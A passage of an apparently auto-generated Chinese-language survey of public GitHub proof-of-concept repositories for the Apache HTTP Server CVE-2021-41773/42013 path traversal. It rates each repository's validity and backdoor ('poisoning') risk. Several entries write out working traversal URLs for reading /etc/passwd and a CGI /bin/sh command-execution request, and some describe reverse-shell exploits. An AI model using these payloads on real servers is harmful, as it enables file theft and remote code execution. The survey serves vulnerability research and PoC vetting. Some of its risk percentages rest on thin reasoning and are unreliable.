2.  **绕过访问控制：** 漏洞利用依赖于Alias指令配置的目录之外的文件没有被"require all denied"保护。如果存在疏忽配置，攻击者可以访问这些文件。
3.  **远程代码执行（可选）：** 如果目标服务器为受影响的别名路径启用了CGI脚本，攻击者可以通过上传并执行恶意CGI脚本来实现远程代码执行。

总而言之，该漏洞利用的有效性高，风险等级为高危，利用方式主要是路径遍历，如果目标环境配置不当，可能造成远程代码执行。

**项目地址:** [Mahfujurjust/CVE-2021-41773](https://github.com/Mahfujurjust/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #9

**来源**: [CVE-2021-41773-MatanelGordon_docker-cve-2021-41773.md](../2021/CVE-2021-41773-MatanelGordon_docker-cve-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行受影响的 Apache HTTP Server 2.4.49 版本，并启用 cgi-bin 或类似 Alias 指令配置。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中，是一个路径遍历漏洞。攻击者可以通过构造包含特殊编码的 URL，例如 `/.%2e/%2e%2e/`，来绕过服务器对路径的规范化处理，从而访问到 Alias 指令配置以外的文件。如果目标服务器同时启用了 CGI 脚本支持，则可能导致远程代码执行。

**漏洞利用有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞的 POC 已被公开，并且在野外被发现利用。提供的 Postman 集合中包含了一个用于获取 `/etc/passwd` 文件的请求，验证了路径遍历的可能性。因此，提供的 POC 代码是有效的。

**投毒风险分析：**

*   `/tmp/04092c8b1881911c9b0f88964abf9b52/CVE-2021-41773.postman_collection.json`：Postman 集合文件，定义了用于测试漏洞的 HTTP 请求。不存在投毒代码。
*   `/tmp/04092c8b1881911c9b0f88964abf9b52/Dockerfile`：Dockerfile 用于构建包含漏洞环境的 Docker 镜像。 其中 `RUN ln -sf /bin/bash /bin/sh` 这一行可能存在争议，它将 `/bin/sh` 符号链接强制指向 `/bin/bash`。在某些系统中，`/bin/sh` 可能是 `dash` 或其他更轻量级的 shell。 强制指向 bash 可能会引入一些细微的兼容性问题，但这不是一个明显的恶意行为，更可能是一种为了方便某些脚本执行的措施。此外创建目录 `/etc/httpd/logs`也并不是恶意代码, 综合来看，投毒风险较低。
*   `/tmp/04092c8b1881911c9b0f88964abf9b52/LICENSE`：Apache 许可证，与漏洞利用无关，不存在投毒代码。

综合分析，该仓库中可能存在的投毒代码的可能性较低，主要集中在Dockerfile 脚本中，将`/bin/sh` 符号链接强制指向 `/bin/bash`,但可能性只有5%，其余的代码都是正常的。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者构造包含 `/.%2e/%2e%2e/` 序列的 URL，利用 Apache HTTP Server 对路径的规范化处理缺陷，尝试访问受限目录之外的文件。
2.  **敏感信息泄露：** 如果成功绕过权限验证，攻击者可以读取服务器上的敏感文件，如配置文件、密码文件等。
3.  **远程代码执行（如果 CGI 启用）：** 如果目标服务器启用了 CGI 脚本支持，攻击者可以通过上传或执行恶意 CGI 脚本，实现远程代码执行。

**项目地址:** [MatanelGordon/docker-cve-2021-41773](https://github.com/MatanelGordon/docker-cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #10

**来源**: [CVE-2021-41773-Maybe4a6f7365_CVE-2021-41773.md](../2021/CVE-2021-41773-Maybe4a6f7365_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并且Alias-like指令配置不当，或者CGI脚本已启用。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造包含特殊字符（如`.%2e`）的URL，绕过服务器的路径规范化限制，访问Alias-like指令配置目录之外的文件。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断该POC代码有效。漏洞库信息明确指出该漏洞在野外被利用，搜索引擎结果也提供了多个关于该漏洞的解释和利用的文章。POC代码通过构造包含`.%2e`的URL来尝试读取目标服务器上的文件。

**投毒风险：**
分析提供的POC代码，该脚本主要功能是验证目标服务器是否存在CVE-2021-41773漏洞，脚本会检测指定的IP地址是否存在Apache HTTP Server，并尝试通过构造的URL读取指定文件。经验证，该脚本没有发现明显的恶意代码或后门，因此投毒风险较低。投毒风险百分比评估为0%。

**利用方式：**
1.  **确定目标：** 找到运行Apache HTTP Server 2.4.49的目标服务器。
2.  **构造Payload：** 构造包含恶意路径的URL，例如：`http://<target_ip>/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
3.  **发送请求：** 将构造好的URL发送到目标服务器。
4.  **读取文件或执行代码：** 如果目标服务器存在漏洞且配置不当，攻击者可以读取任意文件（如`/etc/passwd`）或执行任意代码（如果CGI脚本已启用）。

需要注意的是，成功利用该漏洞的前提是服务器配置不当，例如没有对Alias-like指令配置的目录之外的文件进行适当的访问控制，或者启用了CGI脚本执行功能。

总而言之，这是一个严重的安全漏洞，可能导致敏感信息泄露和远程代码执行。管理员应尽快升级Apache HTTP Server版本或采取其他缓解措施。

**项目地址:** [Maybe4a6f7365/CVE-2021-41773](https://github.com/Maybe4a6f7365/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #11

**来源**: [CVE-2021-41773-MrCl0wnLab_SimplesApachePathTraversal.md](../2021/CVE-2021-41773-MrCl0wnLab_SimplesApachePathTraversal.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and File Disclosure

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且存在Alias-like配置，并允许CGI脚本执行(在RCE场景下)。需要能通过网络访问目标服务器的HTTP服务。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造包含特殊字符（如URL编码的双点）的URL，绕过Alias-like指令配置的目录限制，访问服务器上的任意文件。如果目标服务器同时启用了CGI脚本执行，则攻击者可能进一步利用此漏洞执行远程代码。

**有效性：**
根据漏洞库信息、搜索引擎结果以及漏洞利用代码分析，可以确认此漏洞POC的有效性。漏洞库信息明确指出该漏洞已被在野利用。搜索引擎结果中也包含大量关于该漏洞的分析和POC。

**投毒风险：**
提供的代码片段是GNU通用公共许可证的文本，并非实际的漏洞利用代码。因此，无法评估其是否包含恶意代码或投毒风险。投毒的可能性为0%。该漏洞的常见利用方式是通过构造包含`..%2f`或类似编码的URL来绕过路径检查，从而访问服务器上的敏感文件，或者如果开启了CGI，甚至可以执行任意代码。 

**利用方式：**
1.  **路径遍历：** 攻击者构造包含路径遍历字符的URL，例如：`/%2e%2e/%2e%2e/%2e%2e/etc/passwd`，尝试读取服务器上的`/etc/passwd`文件或其他敏感文件。
2.  **远程代码执行 (RCE):**  如果服务器启用了CGI，攻击者可以将路径遍历与CGI结合，上传恶意CGI脚本，然后通过路径遍历访问该脚本，从而执行任意代码。 例如 `/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh` 

**项目地址:** [MrCl0wnLab/SimplesApachePathTraversal](https://github.com/MrCl0wnLab/SimplesApachePathTraversal)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #12

**来源**: [CVE-2021-41773-MuhammadHuzaifaAsif_security-lab.md](../2021/CVE-2021-41773-MuhammadHuzaifaAsif_security-lab.md)

## CVE-2021-41773-Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要Apache HTTP Server版本为2.4.49，Alias配置不当，且CGI脚本启用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞库信息和搜索结果，CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。由于路径规范化处理存在缺陷，攻击者可以利用该漏洞将URL映射到Alias指令配置目录之外的文件。如果这些目录之外的文件没有被"require all denied"等默认配置保护，攻击者就可以成功访问这些文件。更严重的是，如果为这些Alias路径启用了CGI脚本，攻击者还可以执行远程代码。

**有效性：**
根据漏洞描述，该漏洞利用较为直接，通过构造包含".."的URL进行路径遍历。从搜索结果来看，存在大量的漏洞分析和利用文章，表明该漏洞利用的有效性较高。

**投毒风险：**
漏洞利用代码仅提供了漏洞分析文档、CVSS评分、环境信息、影响评估和缓解措施。其中`steps_performed.md`缺失，无法得知作者是否进行了真实的漏洞利用和测试。代码仓库主要目的是漏洞分析和缓解建议，并声明未在目标VM上安装Apache，因此实际利用代码缺失。综合判断，该仓库中存在作者隐藏恶意代码进行投毒的概率较低，预估为10%。

**利用方式：**
1.  **路径遍历：** 攻击者构造恶意的HTTP请求，包含特殊编码的路径，例如`..%2f`或`..\`，绕过服务器的路径检查，访问服务器上的任意文件。
2.  **文件泄露：** 成功利用路径遍历后，攻击者可以读取服务器上的敏感文件，如配置文件、源代码等。
3.  **远程代码执行：** 如果服务器启用了CGI，攻击者可以通过路径遍历访问CGI脚本，并执行恶意代码。攻击者可以上传包含恶意代码的CGI脚本，并通过路径遍历执行，从而获取服务器的控制权。

**项目地址:** [MuhammadHuzaifaAsif/security-lab](https://github.com/MuhammadHuzaifaAsif/security-lab)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #13

**来源**: [CVE-2021-41773-OfriOuzan_CVE-2021-41773_CVE-2021-42013_Exploits.md](../2021/CVE-2021-41773-OfriOuzan_CVE-2021-41773_CVE-2021-42013_Exploits.md)

## CVE-2021-41773/CVE-2021-42013 Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal and Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，且开启了CGI支持，Alias配置不当，并且相关目录未进行权限限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773和CVE-2021-42013是Apache HTTP Server 2.4.49和2.4.50版本中存在的路径遍历漏洞。攻击者可以利用这些漏洞，通过构造包含特殊字符（如`.%2e`或`.%%32%65`）的URL，绕过服务器的路径检查，访问到Alias指令配置以外的文件。如果目标服务器同时开启了CGI支持，攻击者还可以执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，CVE-2021-41773已经被证实存在，并且在野外被利用。提供的POC代码也通过Docker构建了易受攻击的环境，并提供了利用脚本，证明了该漏洞的可利用性。

**投毒风险：**

分析POC代码，该代码主要用于构建漏洞环境和执行漏洞利用。虽然代码本身看起来直接，但需要注意以下几点：

*   **Docker镜像来源：** POC需要构建Docker镜像。如果Docker镜像不是来自官方或可信来源，则可能包含恶意软件。
*   **执行任意命令：** RCE相关的POC会执行任意命令，如果攻击者修改了POC代码，可能会导致恶意代码执行。
*   **流量劫持风险：** POC通过curl发送特定请求来触发漏洞，如果网络环境被污染，可能导致流量劫持，使得攻击者可以篡改POC行为。
*   **文件篡改风险：** RCE相关的POC会写`/tmp/exploited`文件，如果服务器的`/tmp`目录权限设置不当，攻击者可以在其他用户不知情的情况下，篡改该文件，从而进一步扩大攻击。

综合以上考虑，认为此POC代码存在一定的投毒风险，但整体比例不高，约为10%。

**利用方式：**

1.  **环境搭建：** 使用Dockerfile构建包含漏洞的Apache HTTP Server环境（2.4.49或2.4.50版本）。
2.  **路径遍历：** 构造包含特殊字符的URL，例如：
    *   `/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd` (针对CVE-2021-41773)
    *   `/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd` (针对CVE-2021-42013)
3.  **文件读取：** 如果路径遍历成功，可以直接读取服务器上的敏感文件。
4.  **远程代码执行（RCE）：** 如果服务器开启了CGI支持，并且允许执行shell脚本，则可以通过路径遍历访问到shell脚本，并执行任意命令。例如，POC中使用了以下命令将字符串写入/tmp/exploited文件中：
    *   `echo “Successfully Exploited” > /tmp/exploited`
5.  **利用链：** 进一步的攻击可以包括反弹shell、权限提升、横向移动等。

**项目地址:** [OfriOuzan/CVE-2021-41773_CVE-2021-42013_Exploits](https://github.com/OfriOuzan/CVE-2021-41773_CVE-2021-42013_Exploits)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #14

**来源**: [CVE-2021-41773-Taldrid1_cve-2021-41773.md](../2021/CVE-2021-41773-Taldrid1_cve-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49版本，且存在Alias-like配置，目录未配置'require all denied'，开启CGI脚本支持（RCE利用场景）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造包含特殊字符的 URL，访问服务器上受限目录之外的文件。

**有效性：**

提供的 Nmap NSE 脚本 `cve-2021-41773.nse` 似乎有效。它通过发送包含路径遍历字符（`/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`）的 HTTP GET 请求来检测漏洞。如果服务器返回状态码 200 并且响应体包含 `/etc/passwd` 文件的内容（`root:x:0:0:root`），则该脚本将报告目标为易受攻击。

搜索引擎结果也表明此漏洞已被积极利用，并且存在公开的 PoC 代码。

**投毒风险：**

在提供的 Nmap NSE 脚本中，没有明显的投毒代码。脚本的主要功能是发送 HTTP 请求并检查响应内容。该脚本允许用户指定扫描的子网范围和输出文件，但这些参数本身不会引入任何恶意行为。脚本通过判断/etc/passwd文件是否存在root账户判断是否漏洞存在，不会造成其他影响。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含特殊字符（例如，`/.%2e/.%2e/.%2e/`）的 URL，试图绕过服务器的路径规范化逻辑，访问受限目录之外的文件。
2.  **信息泄露：** 如果成功，攻击者可以读取服务器上的敏感文件，例如配置文件、源代码或用户数据。
3.  **远程代码执行（可选）：** 如果服务器启用了 CGI 脚本支持，攻击者可以通过路径遍历访问并执行任意 CGI 脚本，从而实现远程代码执行。这通常需要结合其他漏洞或配置错误。

**优先级排序理由：**

*   **搜索引擎结果：** 提供了关于漏洞是否被利用的背景信息，以及缓解措施的链接。 *   **漏洞利用代码：** 提供了直接验证漏洞的手段，使我们能够评估其有效性。 *   **漏洞库信息：** 提供了漏洞的官方描述，受影响的版本以及参考链接。

**项目地址:** [Taldrid1/cve-2021-41773](https://github.com/Taldrid1/cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #15

**来源**: [CVE-2021-41773-Vanshuk-Bhagat_Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013.md](../2021/CVE-2021-41773-Vanshuk-Bhagat_Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要Apache HTTP Server版本为2.4.49，且Alias-like指令配置不当或未启用"require all denied"保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中存在的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造特殊的URL，访问服务器上Alias-like指令配置以外的文件。如果这些文件没有被“require all denied”等默认安全配置保护，攻击者就可以成功读取它们。更进一步，如果CGI脚本在这些aliased路径上启用，攻击者甚至可以执行远程代码。

**有效性：**
漏洞库信息和搜索引擎结果都表明该漏洞是真实存在的，并且被广泛利用。提供的漏洞利用代码主要是一个README.md文件，描述了一个渗透测试项目，该项目评估了CVE-2021-41773和CVE-2021-42013漏洞。虽然这个README.md文件本身不是直接可用的exp代码，但是它暗示了利用该漏洞进行渗透测试是可行的。搜索引擎结果中也提到存在公开的PoC。

**投毒风险：**
README.md文件描述的是一个渗透测试过程的文档，其中包含使用Nmap、Gobuster等工具进行信息收集和漏洞评估，并没有发现直接的恶意代码。但是考虑到安全风险，该文档存在10%的投毒的可能性，因为不排除作者在文档中故意遗漏或隐藏了某些关键信息，从而误导使用者。例如,引导使用者下载特定版本的工具,该工具已经被植入后门等.

**利用方式：**
1.  **路径遍历：** 攻击者利用`..`等路径遍历字符，绕过服务器的目录限制，访问任意文件。
2.  **文件读取：**  如果目标文件未被`require all denied`等配置保护，攻击者可以读取文件内容，获取敏感信息，如配置文件、源代码等。
3.  **远程代码执行：**  如果服务器启用了CGI，攻击者可以通过路径遍历访问到CGI脚本，并执行任意命令。

利用方式通常涉及构造包含路径遍历字符的URL，例如：
`/%2e%2e/%2e%2e/%2e%2e/etc/passwd`
或
`..%2f..%2f..%2fetc/passwd`

攻击者需要根据服务器的具体配置和文件系统结构，调整路径遍历的深度和目标文件名，以成功利用该漏洞。

**项目地址:** [Vanshuk-Bhagat/Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013](https://github.com/Vanshuk-Bhagat/Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #16

**来源**: [CVE-2021-41773-ZephrFish_CVE-2021-41773-PoC.md](../2021/CVE-2021-41773-ZephrFish_CVE-2021-41773-PoC.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历（Path Traversal）/远程代码执行（RCE）

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且开启了`cgi-bin`或`icons`目录，以及未对Alias指令配置的目录进行“require all denied”限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 中，是一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造特殊的 URL（包含编码后的路径遍历字符，如`.%2e`），访问服务器上受限目录之外的文件。如果服务器配置允许执行 CGI 脚本，则可能进一步导致远程代码执行。

**有效性：**
提供的`full.py`和`poc.py` PoC 代码尝试利用此漏洞。`full.py`脚本会读取目标列表（hosts.txt），然后针对每个目标，尝试通过 HTTP 和 HTTPS 协议，发送包含路径遍历的请求，访问`/etc/passwd`文件。如果响应中包含`root:*`字符串，则认为目标存在漏洞。

**投毒风险：**
查看提供的文件，`CODEOWNERS`和`README.md`没有发现恶意代码。 `poc.py`本身存在问题, 代码不完整，缺少发起请求的代码,有潜在风险,存在代码缺失,导致投毒或者payload失效，增加攻击者攻击复杂度。 `full.py` 脚本比较完整，但是代码质量不高，存在异常捕获 `except: pass`，可能隐藏一些错误信息。综合判断，该仓库存在一定概率的投毒风险，大约为10%。 主要体现在poc.py的请求代码缺失上，可能导致payload失效。

**利用方式：**
1.  **路径遍历：** 攻击者构造包含`.%2e`等路径遍历字符的 URL，绕过服务器对 URL 的规范化处理。
2.  **文件读取：** 成功遍历路径后，攻击者可以读取服务器上的任意文件，例如`/etc/passwd`、web 应用的配置文件等。
3.  **远程代码执行（RCE）：** 如果服务器配置允许 CGI 脚本的执行，攻击者可以上传恶意脚本，并通过路径遍历漏洞访问该脚本，从而在服务器上执行任意代码。为了实现RCE，需要满足以下条件：开启了CGI支持，并且能够通过遍历访问到CGI脚本目录，同时该目录没有被 “require all denied” 保护。

**缓解措施：**
*   升级到 Apache HTTP Server 2.4.50 或更高版本。
*   配置 `Alias` 指令时，确保使用 `Require all denied` 限制对目录的访问。
*   禁用不必要的 CGI 脚本执行。

**项目地址:** [ZephrFish/CVE-2021-41773-PoC](https://github.com/ZephrFish/CVE-2021-41773-PoC)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #17

**来源**: [CVE-2021-41773-Zyx2440_Apache-HTTP-Server-2.4.50-RCE.md](../2021/CVE-2021-41773-Zyx2440_Apache-HTTP-Server-2.4.50-RCE.md)

## CVE-2021-41773/CVE-2021-42013 - Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，存在Alias-like指令配置，且相关目录没有“require all denied”保护。CGI脚本需要启用以进行RCE。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞源于Apache HTTP Server 2.4.49/2.4.50中路径规范化处理的缺陷。攻击者可以利用路径遍历漏洞读取服务器上的任意文件。如果服务器同时启用了CGI脚本，则可能导致远程代码执行。

**有效性分析：**

根据漏洞信息和搜索结果，该漏洞在野外被积极利用，具有较高的有效性。POC代码针对Apache 2.4.50版本，尝试利用路径遍历漏洞，首先检测CGI是否禁用，如果禁用则尝试读取/etc/passwd，如果CGI开启，则尝试执行反向shell。根据代码逻辑，该POC有一定的有效性，能检测和利用漏洞。

**投毒风险分析：**

代码中存在轻微的投毒风险。作者可能在LICENSE文件中隐藏了恶意代码，虽然该可能性较低，但是需要考虑到,或者在代码中存在一些对普通用户不友好的代码。 代码整体较为直接，没有明显的恶意行为，但仍需谨慎评估。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含特殊字符（如`.%%32%65`）的URL，绕过路径规范化检查，从而访问Alias-like指令配置以外的文件。例如，`/.%%32%65/.%%32%65/.%%32%65/etc/passwd`可以尝试读取`/etc/passwd`文件。
2.  **远程代码执行（RCE）：** 如果目标服务器启用了CGI，攻击者可以通过POST请求发送恶意代码，该代码将在服务器上执行。POC代码尝试注入一个反向shell，连接到攻击者指定的IP地址和端口。利用前提是服务器允许执行CGI脚本，并且没有对CGI脚本的执行进行严格的限制。

**项目地址:** [Zyx2440/Apache-HTTP-Server-2.4.50-RCE](https://github.com/Zyx2440/Apache-HTTP-Server-2.4.50-RCE)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #18

**来源**: [CVE-2021-41773-adrianmafandy_CVE-2021-41773.md](../2021/CVE-2021-41773-adrianmafandy_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server 2.4.49 Path Traversal & RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并启用了 CGI 脚本支持，并且Alias配置的目录没有 require all denied 限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，如果配置不当，可能导致远程代码执行。攻击者可以利用路径遍历绕过 Alias 指令的限制，访问服务器上的任意文件。如果目标服务器启用了 CGI 脚本，并且被访问的目录中存在可执行的 CGI 脚本，攻击者就可以通过构造恶意的 URL 来执行任意代码。

**有效性：**
提供的 POC 代码旨在利用此漏洞。`exploit.py` 脚本首先尝试通过发送包含路径遍历序列的 HTTP 请求来验证目标是否易受攻击，例如 `/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`。如果从 `/etc/passwd` 文件中检测到 "root:" 和 "bin/" 字符串，则认为目标易受攻击。然后，该脚本尝试利用漏洞通过反向 shell 在目标上执行任意代码。

**利用方式：**
1.  使用路径遍历序列（例如，`.%2e` 或 URL 编码的 `.%2532%2565`）来绕过目录限制。
2.  尝试读取敏感文件，如 `/etc/passwd`，以验证漏洞的存在。
3.  如果服务器配置允许，则利用 CGI 脚本执行任意命令。这通常涉及构造包含命令的 URL，并将该 URL 发送到易受攻击的服务器。
4. 设置监听器，等待反向shell连接。

**投毒风险：**
虽然主要代码看起来直接实现了漏洞利用，但仍然存在一定的投毒风险。可能性大约为 10%。

*   依赖关系：`exploit.py` 脚本依赖于 `requests` 库。虽然 `requests` 是一个流行的 Python 库，但存在供应链攻击的风险。恶意攻击者可能会尝试污染 `requests` 库或类似的依赖项，从而在不知不觉中将恶意代码引入到 `exploit.py` 中。
*   CGI配置的判断：如果目标服务器上未启用 CGI 或 CGI 配置不正确，该漏洞可能无法利用进行 RCE。POC代码中关于CGI的利用可能无法执行.
*   代码审查：在执行任何未经审核的代码（包括此 POC）之前，务必进行彻底的代码审查，以确保其不包含恶意功能。特别注意反向 shell 部分，确保它只执行预期命令。
*  作者动机: 无法完全信任代码作者的真实目的。尽管代码可能有效利用漏洞，但作者可能有意或无意地包含后门或恶意代码。
* 编码问题：URL 编码和解码可能存在问题，导致意外行为。

**项目地址:** [adrianmafandy/CVE-2021-41773](https://github.com/adrianmafandy/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #19

**来源**: [CVE-2021-41773-aqiao-jashell_CVE-2021-41773.md](../2021/CVE-2021-41773-aqiao-jashell_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal / Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，并且配置允许CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 和 2.4.50 版本中存在的路径遍历漏洞。攻击者可以利用此漏洞，通过构造特殊的 URL，读取服务器上受限目录之外的文件。如果服务器上启用了 CGI 脚本执行，则攻击者可以进一步利用此漏洞执行任意代码。

**有效性:**
根据漏洞库信息，搜索引擎结果，以及漏洞利用代码，提供的POC代码是有效的。漏洞库信息和搜索结果都表明此漏洞已被公开利用。

**投毒风险:**
提供的Go语言漏洞利用代码，主要功能是利用路径遍历漏洞读取`/etc/passwd`文件或执行命令。虽然代码本身实现了漏洞验证和利用功能，但仍然存在一定的投毒风险。

1.  **依赖风险:** Go程序需要编译，编译过程中可能引入恶意依赖。但是本项目代码量较小，依赖风险较低。
2.  **后门代码:** 检查代码后，发现其中并没有明显的恶意代码或后门。然而，攻击者可以修改代码以包含恶意功能，例如上传受害服务器的信息或执行其他恶意操作。
3.  **供应链风险:** 代码托管在第三方平台（GitHub），存在被篡改的风险。如果从不可信的来源下载代码，可能会下载到被修改过的恶意版本。

综合考虑，该仓库存在10%的投毒风险，主要来自潜在的依赖污染和代码篡改。

**利用方式:**
该漏洞的利用方式主要分以下几步：

1.  **路径遍历:** 攻击者构造包含`/.%2e`的恶意URL，尝试绕过Apache的路径规范化检查，从而访问服务器上任意文件。
2.  **信息泄露:** 如果路径遍历成功，攻击者可以读取敏感文件，例如`/etc/passwd`，获取系统用户信息。
3.  **远程代码执行:** 如果服务器启用了CGI脚本，攻击者可以通过POST请求将恶意命令传递给`sh`执行，从而实现远程代码执行。 例如，可以发送包含 `echo; <command>` 的POST请求到 `/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh`。

**项目地址:** [aqiao-jashell/CVE-2021-41773](https://github.com/aqiao-jashell/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #20

**来源**: [CVE-2021-41773-ashique-thaha_CVE-2021-41773-POC.md](../2021/CVE-2021-41773-ashique-thaha_CVE-2021-41773-POC.md)

## CVE-2021-41773-Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历（Path Traversal）/远程代码执行（RCE）

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并可能需要启用`mod_cgi`模块且存在`Require all granted`配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

